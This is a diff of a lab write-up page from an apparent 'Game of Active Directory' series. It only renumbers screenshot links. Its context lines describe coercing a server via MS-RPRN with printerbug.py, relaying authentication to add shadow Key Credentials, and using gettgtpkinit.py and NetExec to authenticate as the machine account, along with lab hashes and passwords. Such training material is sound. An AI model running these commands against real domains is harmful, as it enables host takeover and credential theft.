@@ -839,10 +839,10 @@ ESSOS.LOCAL/khal.drogo:$DCC2$10240#khal.drogo#f6e0610d7070ac77c69f566696f4e1d5: 
 
 <p>To drive traffic into this trap, we utilize printerbug.py as a surgical trigger against the Braavos server. This script leverages the MS-RPRN Print Spooler interface to coerce the machine into authenticating back to our attack IP. Once the RPC command is sent, Braavos initiates a standard SMB connection to us. Our relay intercepts this authentication stream, authenticates to the Domain Controller as BRAAVOS$, and utilizes the "Write Property" permission (which we manually enabled for the SELF principal in the previous lab setup) to append a new Key Credential to its own object. The successful execution results in the relay server generating and saving a PFX certificate file locally on our attack machine, effectively handing us a digital smartcard for the victim server.</p>
 <p>python3 printerbug.py 'essos.local/khal.drago:horse'@'braavos.essos.local' 10.4.10.179</p>
-<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_30.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_26.png" alt="">
 
 
-<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_31.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_27.png" alt="">
 
 
 <h4>Step 3: The Result & Usage</h4>
@@ -850,7 +850,7 @@ ESSOS.LOCAL/khal.drogo:$DCC2$10240#khal.drogo#f6e0610d7070ac77c69f566696f4e1d5: 
 <p>With the forged PFX certificate securely in our possession, we transition from the exploitation phase to the authentication phase. This step is critical because we are moving from a proprietary attack mechanism to a legitimate feature of the Kerberos protocol known as Public Key Cryptography for Initial Authentication (PKINIT). We leverage the gettgtpkinit.py utility to interface with the Key Distribution Center (KDC) on Meereen. This tool performs a standard Kerberos AS-REQ, but instead of encrypting the timestamp with a password hash (which we do not have), it signs the request using the private key inside our looted PFX file.</p>
 <p>The Domain Controller validates the signature against the public key we injected into the msDS-KeyCredentialLink attribute of the BRAAVOS$ object. Finding a match, the KDC issues a Ticket Granting Ticket (TGT) valid for the machine account. The tool saves this ticket as a Credential Cache (ccache) file. This artifact is the operational equivalent of knowing the computer account's 120-character random password; it allows us to interact with any service in the forest that trusts this specific computer identity.</p>
 <p>python3 PKINITtools/gettgtpkinit.py -cert-pfx QLLw3a2R.pfx -pfx-pass xMzZAZ1diw77ppAqx4nZ essos.local/BRAAVOS$ QLLw3a2R.ccache</p>
-<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_32.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_28.png" alt="">
 
 
 
@@ -858,7 +858,7 @@ ESSOS.LOCAL/khal.drogo:$DCC2$10240#khal.drogo#f6e0610d7070ac77c69f566696f4e1d5: 
 <p>We verify our access by targeting the victim host itself using NetExec. We invoke the tool with the -k (Use Kerberos) and --use-kcache (Use the environment ticket) flags against the Fully Qualified Domain Name of Braavos. The successful output shows us authenticating as ESSOS.LOCAL\BRAAVOS$. </p>
 <p>export KRB5CCNAME=QLLw3a2R.ccache</p>
 <p>poetry run netexec smb braavos.essos.local -k --use-kcache</p>
-<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_33.png" alt="">
+<img src="./game-of-active-directory/part-4-ntlm-relaying/images/screenshot_29.png" alt="">
 
 
 <p>This confirms that we have achieved total compromise of the host by becoming the host itself. From this position, we have the privileges of the Local System account, allowing us to perform tasks such as dumping local secrets, scheduling administrative jobs, or leveraging the machine's trusted identity to attack other resources within the domain.</p>
